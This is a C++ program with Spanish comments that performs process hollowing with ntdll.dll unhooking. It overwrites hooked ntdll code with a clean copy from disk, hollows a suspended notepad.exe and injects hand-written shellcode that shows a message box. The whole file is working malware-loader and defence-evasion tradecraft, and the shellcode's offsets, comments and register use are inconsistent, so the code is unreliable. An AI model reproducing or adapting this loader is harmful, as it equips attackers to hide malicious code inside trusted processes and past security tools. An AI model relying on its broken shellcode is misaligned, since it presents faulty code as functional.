#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iostream>

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

#define ProcessBasicInformation 0

typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

unsigned char shellcode[] = {
    // Calcular dirección base del shellcode
    0x48, 0x89, 0xC8,               // mov rax, rcx        ; rcx contiene la dirección de entrada
    0x48, 0x31, 0xC9,               // xor rcx, rcx        ; hWnd = NULL
    
    // Calcular dirección del mensaje (rax + 0x3E)
    0x48, 0x8D, 0x90, 0x3E, 0x00, 0x00, 0x00,   // lea rdx, [rax + 0x3E]
    
    // Calcular dirección del título (rax + 0x55)
    0x49, 0x8D, 0x88, 0x55, 0x00, 0x00, 0x00,   // lea r8, [rax + 0x55]
    
    0x48, 0x31, 0xF6,               // xor rsi, rsi        ; uType = MB_OK
    
    // Llamar a MessageBoxA
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, MessageBoxA
    0xFF, 0xD0,                     // call rax
    
    // Salir del hilo
    0x48, 0x31, 0xC9,               // xor rcx, rcx        ; ExitCode = 0
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, ExitThread
    0xFF, 0xD0,                     // call rax
    
    // Datos: Mensaje y Título
    'H', 'o', 'l', 'a', ' ', 'd', 'e', 's', 'd', 'e', ' ', 'e', 'l', ' ', 'p', 'a', 'y', 'l', 'o', 'a', 'd', '!', 0,
    'H', 'o', 'l', 'l', 'o', 'w', ' ', 'P', 'r', 'o', 'c', 'e', 's', 's', 0
};

void UnhookNtdll() {
    std::cout << "[+] Iniciando proceso de unhooking de ntdll.dll..." << std::endl;
    
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        std::cerr << "[-] Error al obtener handle de ntdll.dll: " << GetLastError() << std::endl;
        return;
    }
    
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Error al abrir ntdll.dll: " << GetLastError() << std::endl;
        return;
    }
    
    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMap) {
        std::cerr << "[-] Error al crear file mapping: " << GetLastError() << std::endl;
        CloseHandle(hFile);
        return;
    }
    
    LPVOID cleanNtdll = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!cleanNtdll) {
        std::cerr << "[-] Error al mapear vista del archivo: " << GetLastError() << std::endl;
        CloseHandle(hMap);
        CloseHandle(hFile);
        return;
    }
    
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((DWORD_PTR)cleanNtdll + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    
    std::cout << "[+] Analizando secciones de ntdll.dll..." << std::endl;
    
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSection[i].Name, ".text") == 0) {
            std::cout << "[+] Sección .text encontrada. Restaurando bytes originales..." << std::endl;
            
            void* target = (void*)((DWORD_PTR)hNtdll + pSection[i].VirtualAddress);
            void* source = (void*)((DWORD_PTR)cleanNtdll + pSection[i].PointerToRawData);
            DWORD oldProtect;
            
            if (!VirtualProtect(target, pSection[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                std::cerr << "[-] Error al cambiar permisos de memoria: " << GetLastError() << std::endl;
                UnmapViewOfFile(cleanNtdll);
                CloseHandle(hMap);
                CloseHandle(hFile);
                return;
            }
            
            memcpy(target, source, pSection[i].Misc.VirtualSize);
            
            VirtualProtect(target, pSection[i].Misc.VirtualSize, oldProtect, &oldProtect);
            
            std::cout << "[+] Sección .text restaurada exitosamente." << std::endl;
            break;
        }
    }
    
    UnmapViewOfFile(cleanNtdll);
    CloseHandle(hMap);
    CloseHandle(hFile);
    
    std::cout << "[+] Proceso de unhooking completado." << std::endl;
}

bool GetProcessBaseAddress(HANDLE hProcess, DWORD_PTR& baseAddress) {
    HMODULE hMods[1024];
    DWORD cbNeeded;
    
    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        baseAddress = (DWORD_PTR)hMods[0];
        return true;
    }
    
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        std::cerr << "[-] Error al obtener handle de ntdll.dll: " << GetLastError() << std::endl;
        return false;
    }
    
    pNtQueryInformationProcess NtQueryInformationProcess = 
        (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    
    if (!NtQueryInformationProcess) {
        std::cerr << "[-] Error al obtener NtQueryInformationProcess" << std::endl;
        return false;
    }
    
    PROCESS_BASIC_INFORMATION pbi;
    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
    
    if (status != 0) {
        std::cerr << "[-] Error en NtQueryInformationProcess: 0x" << std::hex << status << std::endl;
        return false;
    }
    
    PVOID pebAddress = pbi.PebBaseAddress;
    
    PVOID imageBaseAddress;
    if (!ReadProcessMemory(hProcess, (PBYTE)pebAddress + 0x10, &imageBaseAddress, sizeof(PVOID), NULL)) {
        std::cerr << "[-] Error al leer ImageBaseAddress del PEB: " << GetLastError() << std::endl;
        return false;
    }
    
    baseAddress = (DWORD_PTR)imageBaseAddress;
    return true;
}

int main() {
    std::cout << "=== Proceso Hollowing con Unhooking ===" << std::endl;
    
    UnhookNtdll();
    
    std::cout << "\n[+] Preparando payload..." << std::endl;
    
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    
    if (!hUser32 || !hKernel32) {
        std::cerr << "[-] Error al cargar las bibliotecas necesarias" << std::endl;
        return 1;
    }
    
    FARPROC pMessageBoxA = GetProcAddress(hUser32, "MessageBoxA");
    FARPROC pExitThread = GetProcAddress(hKernel32, "ExitThread");
    
    if (!pMessageBoxA || !pExitThread) {
        std::cerr << "[-] Error al obtener direcciones de funciones" << std::endl;
        return 1;
    }
    
    memcpy(shellcode + 0x2A, &pMessageBoxA, sizeof(void*)); 
    memcpy(shellcode + 0x37, &pExitThread, sizeof(void*));   
    
    std::cout << "[+] Payload preparado correctamente." << std::endl;
    
    std::cout << "\n[+] Creando proceso suspendido de notepad.exe..." << std::endl;
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    if (!CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi)) {
        std::cerr << "[-] Error al crear el proceso: " << GetLastError() << std::endl;
        return 1;
    }
    
    std::cout << "[+] Proceso creado con PID: " << pi.dwProcessId << std::endl;
    
    DWORD_PTR imageBaseAddress;
    if (!GetProcessBaseAddress(pi.hProcess, imageBaseAddress)) {
        std::cerr << "[-] Error al obtener la dirección base del proceso" << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    
    std::cout << "[+] Dirección base de la imagen: 0x" << std::hex << imageBaseAddress << std::endl;
    
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    
    if (!GetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "[-] Error al obtener el contexto del hilo: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)malloc(sizeof(IMAGE_DOS_HEADER));
    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)imageBaseAddress, pDosHeader, sizeof(IMAGE_DOS_HEADER), NULL)) {
        std::cerr << "[-] Error al leer DOS header: " << GetLastError() << std::endl;
        free(pDosHeader);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)malloc(sizeof(IMAGE_NT_HEADERS));
    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)(imageBaseAddress + pDosHeader->e_lfanew), pNtHeaders, sizeof(IMAGE_NT_HEADERS), NULL)) {
        std::cerr << "[-] Error al leer NT headers: " << GetLastError() << std::endl;
        free(pDosHeader);
        free(pNtHeaders);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    
    DWORD entryPoint = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
    free(pDosHeader);
    free(pNtHeaders);
    
    std::cout << "[+] Punto de entrada original: 0x" << std::hex << (imageBaseAddress + entryPoint) << std::endl;
    
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtUnmapViewOfSection NtUnmapViewOfSection = 
        (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    
    if (!NtUnmapViewOfSection) {
        std::cerr << "[-] Error al obtener NtUnmapViewOfSection" << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    
    NTSTATUS status = NtUnmapViewOfSection(pi.hProcess, (PVOID)imageBaseAddress);
    if (status != 0) {
        std::cerr << "[-] Error en NtUnmapViewOfSection: 0x" << std::hex << status << std::endl;
        std::cerr << "[+] Continuando sin desmapear la imagen..." << std::endl;
    } else {
        std::cout << "[+] Imagen original desmapeada correctamente" << std::endl;
    }
    
    SIZE_T shellcodeSize = sizeof(shellcode);
    LPVOID newBase = (LPVOID)imageBaseAddress;
    
    std::cout << "[+] Asignando memoria en el proceso remoto..." << std::endl;
    
    if (!VirtualAllocEx(pi.hProcess, newBase, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) {
        std::cerr << "[-] Error al asignar memoria: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    
    std::cout << "[+] Memoria asignada en: 0x" << std::hex << newBase << std::endl;
    
    if (!WriteProcessMemory(pi.hProcess, newBase, shellcode, shellcodeSize, NULL)) {
        std::cerr << "[-] Error al escribir en memoria: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    
    std::cout << "[+] Payload escrito en la memoria del proceso remoto" << std::endl;
    
    ctx.Rcx = (DWORD_PTR)newBase;
    
    if (!SetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "[-] Error al establecer el contexto del hilo: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    
    std::cout << "[+] Contexto del hilo modificado correctamente" << std::endl;
    
    std::cout << "[+] Resumiendo el proceso..." << std::endl;
    
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        std::cerr << "[-] Error al reanudar el hilo: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    
    std::cout << "[+] Proceso resumido. El payload debería ejecutarse ahora." << std::endl;
    std::cout << "[+] Si todo fue bien, debería aparecer un MessageBox con el mensaje 'Hola desde el payload!'" << std::endl;
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return 0;
}